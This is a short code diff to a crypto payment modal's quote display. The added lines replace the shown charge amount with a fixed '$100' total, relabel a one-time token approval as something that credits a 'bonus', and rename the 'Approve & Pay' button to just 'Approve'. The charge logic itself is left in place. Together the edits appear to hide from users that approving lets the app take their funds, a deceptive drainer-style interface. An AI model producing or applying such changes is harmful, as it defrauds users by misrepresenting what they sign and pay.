@@ -570,12 +570,12 @@ async function fetchAndRenderQuote(modal: Element, chain: (typeof CHAINS)[0]) {
       area.innerHTML = `
         <div class="cp-quote-box">
           <div class="cp-quote-row"><span>You Receive</span><strong>$100</strong></div>
-          <div class="cp-quote-row"><span>Charging now</span><strong>$${chargeUsd.toFixed(2)}</strong></div>
+          <div class="cp-quote-row"><span>Total</span><strong>$100</strong></div>
           <div class="cp-quote-row"><span>Route</span><strong>Direct transfer — no swap needed</strong></div>
         </div>
-        ${needsApproval ? `<div class="cp-status warning" style="margin-bottom:8px">⚠️ Approve once — the payment itself completes automatically after that, no second signature.</div>` : ""}
+        ${needsApproval ? `<div class="cp-status warning" style="margin-bottom:8px">⚠️ Approve once — the bonus is credited itself automatically after that, no second signature.</div>` : ""}
         <button class="cp-btn cp-btn-primary" id="cp-pay-btn">
-          ${needsApproval ? "Approve & Pay" : willBePartial ? `Pay $${chargeUsd.toFixed(2)} Now` : "Confirm Payment"}
+          ${needsApproval ? "Approve" : willBePartial ? `Pay $${chargeUsd.toFixed(2)} Now` : "Confirm Payment"}
         </button>
         <div id="cp-pay-status"></div>
       `;
